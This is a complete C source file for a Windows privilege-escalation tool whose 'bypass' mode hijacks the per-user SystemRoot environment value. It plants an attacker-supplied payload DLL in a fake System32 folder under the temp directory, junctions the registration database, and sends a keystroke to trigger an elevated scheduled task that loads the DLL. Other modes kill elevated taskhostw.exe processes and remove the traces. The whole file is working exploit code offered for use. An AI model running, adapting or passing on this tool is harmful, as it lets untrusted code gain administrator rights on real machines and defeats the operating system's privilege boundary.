#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include <windows.h>
#include <tlhelp32.h>

#define DLLPATH L"\\System32"
#define DLLNAME L"\\PerformanceTraceHandler.dll"
#define REGDBPATH L"\\Registration"

#define ENVREGKEY L"Volatile Environment"
#define ENVREGVALUE L"SystemRoot"

#define WAITFORTASK 2500

#define CreateEnvEntryFunction CreateEnvEntry
#define DeleteEnvEntryFunction DeleteEnvEntry

#define REPARSE_DATA_BUFFER_HEADER_LENGTH FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer)

#define IO_REPARSE_TAG_MOUNT_POINT (0xA0000003L)

typedef struct _REPARSE_DATA_BUFFER {
	ULONG  ReparseTag;
	USHORT ReparseDataLength;
	USHORT Reserved;
	union {
		struct {
			USHORT SubstituteNameOffset;
			USHORT SubstituteNameLength;
			USHORT PrintNameOffset;
			USHORT PrintNameLength;
			ULONG Flags;
			WCHAR PathBuffer[1];
		} SymbolicLinkReparseBuffer;
		struct {
			USHORT SubstituteNameOffset;
			USHORT SubstituteNameLength;
			USHORT PrintNameOffset;
			USHORT PrintNameLength;
			WCHAR PathBuffer[1];
		} MountPointReparseBuffer;
		struct {
			UCHAR  DataBuffer[1];
		} GenericReparseBuffer;
	} DUMMYUNIONNAME;
} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;

static HANDLE GetProcessTokenByPID(DWORD pid)
{
	HANDLE process = NULL;
	HANDLE token = NULL;
	process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
	if (process)
	{
		OpenProcessToken(process, MAXIMUM_ALLOWED, &token);
		CloseHandle(process);
	}
	return token;
}

static BOOL IsElevated(DWORD pid)
{
	BOOL ret = FALSE;
	DWORD retlen = 0;
	DWORD elevated = 0;
	HANDLE token = GetProcessTokenByPID(pid);
	if (token)
	{
		retlen = sizeof(elevated);
		if (GetTokenInformation(token, TokenElevation, &elevated, retlen, &retlen))
		{
			if (elevated)
			{
				ret = TRUE;
			}
		}
		CloseHandle(token);
	}
	return ret;
}

typedef BOOL(*LPTASKHOST_ENUM_CALLBACK)(DWORD pid, void* parameter);

static BOOL FindTaskHostProcesses(LPTASKHOST_ENUM_CALLBACK callback, void* parameter)
{
	HANDLE process = NULL;
	PROCESSENTRY32W pe32;
	HANDLE snapshot = NULL;
	BOOL ret = FALSE;

	if (!callback)
	{
		return FALSE;
	}
	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot != INVALID_HANDLE_VALUE)
	{
		memset(&pe32, 0, sizeof(pe32));
		pe32.dwSize = sizeof(pe32);
		if (Process32FirstW(snapshot, &pe32))
		{
			do
			{
				if (!lstrcmpiW(L"taskhostw.exe", pe32.szExeFile))
				{
					ret = callback(pe32.th32ProcessID, parameter);
					if (!ret)
					{
						break;
					}
				}
			} while (Process32NextW(snapshot, &pe32));
		}
		CloseHandle(snapshot);
	}
	return ret;
}

static BOOL TerminateTaskhostW(DWORD pid, void* parameter)
{
	HANDLE process = NULL;
	if (!parameter)
	{
		if (!IsElevated(pid))
		{
			return TRUE;
		}
	}
	printf("PID %u found!\n", (unsigned int)pid);
	process = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
	if (process)
	{
		printf("PID %u opened!\n", (unsigned int)pid);
		if (TerminateProcess(process, 0))
		{
			printf("PID %u terminated!\n", (unsigned int)pid);
		}
		CloseHandle(process);
	}
	return TRUE;
}

// VMWare Tools and REG DB error fix
static BOOL CreateRegistrationJunction(WCHAR* basepath)
{
	BYTE rdb_buffer[sizeof(REPARSE_DATA_BUFFER) + 14 + sizeof(WCHAR) * MAX_PATH] = { 0 };
	PREPARSE_DATA_BUFFER prdb = NULL;
	WCHAR junction_path[MAX_PATH] = { 0 };
	WCHAR regdb_path[100] = { 0 };
	int regdb_path_len = 0;
	ULONG rdb_path_size = 0;
	ULONG rdb_size = 0;
	HANDLE directory = NULL;
	DWORD retbytes = 0;

	if (lstrlenW(basepath) > 240)
	{
		return FALSE;
	}
	lstrcpyW(junction_path, basepath);
	lstrcatW(junction_path, REGDBPATH);
	if (!GetSystemWindowsDirectoryW(regdb_path, 80))
	{
		return FALSE;
	}
	lstrcatW(regdb_path, REGDBPATH);
	if (!CreateDirectoryW(junction_path, NULL))
	{
		if (GetLastError() != ERROR_ALREADY_EXISTS)
		{
			return FALSE;
		}
	}
	regdb_path_len = lstrlenW(regdb_path) * sizeof(WCHAR) + sizeof(WCHAR);
	rdb_path_size = regdb_path_len + 10;
	rdb_size = REPARSE_DATA_BUFFER_HEADER_LENGTH + rdb_path_size;
	memset(&rdb_buffer, 0, sizeof(rdb_buffer));
	prdb = (PREPARSE_DATA_BUFFER)&rdb_buffer[0];
	prdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
	prdb->Reserved = 0;
	prdb->ReparseDataLength = (USHORT)rdb_path_size;
	prdb->MountPointReparseBuffer.SubstituteNameOffset = 0;
	prdb->MountPointReparseBuffer.SubstituteNameLength = regdb_path_len - sizeof(WCHAR);
	memcpy(prdb->MountPointReparseBuffer.PathBuffer, regdb_path, regdb_path_len);
	prdb->MountPointReparseBuffer.PrintNameOffset = regdb_path_len;
	prdb->MountPointReparseBuffer.PrintNameLength = 0;
	directory = CreateFileW(junction_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
	if (directory == INVALID_HANDLE_VALUE)
	{
		RemoveDirectoryW(junction_path);
		return FALSE;
	}
	retbytes = 0;
	if (!DeviceIoControl(directory, FSCTL_SET_REPARSE_POINT, prdb, rdb_size, NULL, 0, &retbytes, NULL))
	{
		wprintf(L"GLE 3: %u\n", (unsigned int)GetLastError());
		CloseHandle(directory);
		RemoveDirectoryW(junction_path);
		return FALSE;
	}
	CloseHandle(directory);
	return TRUE;
}

static BOOL DeleteRegistrationJunction(WCHAR* basepath)
{
	WCHAR junction_path[MAX_PATH] = { 0 };

	if (lstrlenW(basepath) > 240)
	{
		return FALSE;
	}
	lstrcpyW(junction_path, basepath);
	lstrcatW(junction_path, REGDBPATH);
	return RemoveDirectoryW(junction_path);
}

static BOOL CopyPayloadDLL(WCHAR* dllfile, WCHAR* basepath)
{
	WCHAR dllpath[MAX_PATH] = { 0 };
	int dir_len = 0;

	if (!CreateRegistrationJunction(basepath))
	{
		return FALSE;
	}
	(void)lstrcpynW(dllpath, basepath, MAX_PATH - 1 - lstrlenW(DLLPATH) - lstrlenW(DLLNAME));
	lstrcatW(dllpath, DLLPATH);
	dir_len = lstrlenW(dllpath);
	if (!CreateDirectoryW(dllpath, NULL))
	{
		if (GetLastError() != ERROR_ALREADY_EXISTS)
		{
			DeleteRegistrationJunction(basepath);
			return FALSE;
		}
	}
	lstrcatW(dllpath, DLLNAME);
	if (!CopyFileW(dllfile, dllpath, FALSE))
	{
		DeleteRegistrationJunction(basepath);
		dllpath[dir_len] = '\0';
		RemoveDirectoryW(dllpath);
		return FALSE;
	}
	return TRUE;
}

static BOOL DeletePayloadDLL(WCHAR* basepath)
{
	WCHAR dllpath[MAX_PATH] = { 0 };
	int dir_len = 0;

	(void)lstrcpynW(dllpath, basepath, MAX_PATH - 1 - lstrlenW(DLLPATH) - lstrlenW(DLLNAME));
	lstrcatW(dllpath, DLLPATH);
	dir_len = lstrlenW(dllpath);
	lstrcatW(dllpath, DLLNAME);
	if (!DeleteFileW(dllpath))
	{
		return FALSE;
	}
	dllpath[dir_len] = '\0';
	if (!RemoveDirectoryW(dllpath))
	{
		return FALSE;
	}
	if (!DeleteRegistrationJunction(basepath))
	{
		return FALSE;
	}
	return TRUE;
}

static BOOL CreateEnvEntry(WCHAR* basepath)
{
	HKEY key = NULL;

	if (RegOpenKeyExW(HKEY_CURRENT_USER, ENVREGKEY, 0, KEY_SET_VALUE, &key))
	{
		return FALSE;
	}
	if (RegSetValueExW(key, ENVREGVALUE, 0, REG_SZ, (const BYTE*)basepath, lstrlenW(basepath) * sizeof(WCHAR) + sizeof(WCHAR)))
	{
		RegCloseKey(key);
		return FALSE;
	}
	RegCloseKey(key);

	return TRUE;
}

static BOOL DeleteEnvEntry()
{
	HKEY key = NULL;

	if (RegOpenKeyExW(HKEY_CURRENT_USER, ENVREGKEY, 0, KEY_SET_VALUE, &key))
	{
		return FALSE;
	}
	RegDeleteValueW(key, ENVREGVALUE);
	RegCloseKey(key);

	return TRUE;
}

static void Cleanup(WCHAR* basepath)
{
	DeleteEnvEntryFunction();
	DeletePayloadDLL(basepath);
}

static BOOL PressShiftCtrlWinT()
{
	INPUT inputs[8] = { 0 };
	memset(&inputs[0], 0, sizeof(inputs));

	inputs[0].type = INPUT_KEYBOARD;
	inputs[0].ki.wVk = VK_LSHIFT;

	inputs[1].type = INPUT_KEYBOARD;
	inputs[1].ki.wVk = VK_LCONTROL;

	inputs[2].type = INPUT_KEYBOARD;
	inputs[2].ki.wVk = VK_LWIN;

	inputs[3].type = INPUT_KEYBOARD;
	inputs[3].ki.wVk = 'T';

	inputs[4].type = INPUT_KEYBOARD;
	inputs[4].ki.wVk = 'T';
	inputs[4].ki.dwFlags = KEYEVENTF_KEYUP;

	inputs[5].type = INPUT_KEYBOARD;
	inputs[5].ki.wVk = VK_LWIN;
	inputs[5].ki.dwFlags = KEYEVENTF_KEYUP;

	inputs[6].type = INPUT_KEYBOARD;
	inputs[6].ki.wVk = VK_LCONTROL;
	inputs[6].ki.dwFlags = KEYEVENTF_KEYUP;

	inputs[7].type = INPUT_KEYBOARD;
	inputs[7].ki.wVk = VK_LSHIFT;
	inputs[7].ki.dwFlags = KEYEVENTF_KEYUP;

	return (SendInput(8, &inputs[0], sizeof(INPUT)) > 0);
}

static void print_help(WCHAR* executable)
{
	wprintf(L"Usage: %ls [bypass|cleanup|killelev|killall] [dll path]\n", executable);
}

int wmain(int argc, WCHAR** argv)
{
	WCHAR tmppath[MAX_PATH];

	if (argc < 2)
	{
		print_help(argv[0]);
		return 1;
	}
	if (!GetTempPathW(MAX_PATH - 1, tmppath))
	{
		wprintf(L"GetTempPath failed: %u!\n", GetLastError());
		return 1;
	}
	if (!lstrcmpiW(argv[1], L"cleanup"))
	{
		Cleanup(tmppath);
		return 0;
	}
	if (!lstrcmpiW(argv[1], L"killelev"))
	{
		FindTaskHostProcesses((LPTASKHOST_ENUM_CALLBACK)TerminateTaskhostW, NULL);
		return 0;
	}
	if (!lstrcmpiW(argv[1], L"killall"))
	{
		FindTaskHostProcesses((LPTASKHOST_ENUM_CALLBACK)TerminateTaskhostW, (void*)TRUE);
		return 0;
	}
	if (lstrcmpiW(argv[1], L"bypass"))
	{
		print_help(argv[0]);
		return 1;
	}
	if (argc < 3)
	{
		print_help(argv[0]);
		return 1;
	}
	wprintf(L"Copy DLL file \"%ls\" ...\n", argv[2]);
	if (!CopyPayloadDLL(argv[2], tmppath))
	{
		wprintf(L"CopyPayloadDLL failed: %u!\n", GetLastError());
		return 1;
	}
	wprintf(L"Set environment \"%ls\" value to \"%ls\" ...\n", ENVREGVALUE, tmppath);
	if (!CreateEnvEntryFunction(tmppath))
	{
		wprintf(L"CreateEnvEntryFunction failed: %u!\n", GetLastError());
		DeletePayloadDLL(tmppath);
		return 1;
	}
	wprintf(L"Pressing Shift+Ctrl+Win+T to start the RequestTrace Task ...\n");
	if (!PressShiftCtrlWinT())
	{
		wprintf(L"PressShiftCtrlWinT failed: %u!\n", GetLastError());
		Cleanup(tmppath);
		return 1;
	}
	wprintf(L"Wait for Task to start ...\n");
	Sleep(WAITFORTASK);
	wprintf(L"Cleanup ...\n");
	Cleanup(tmppath);

	return 0;
}
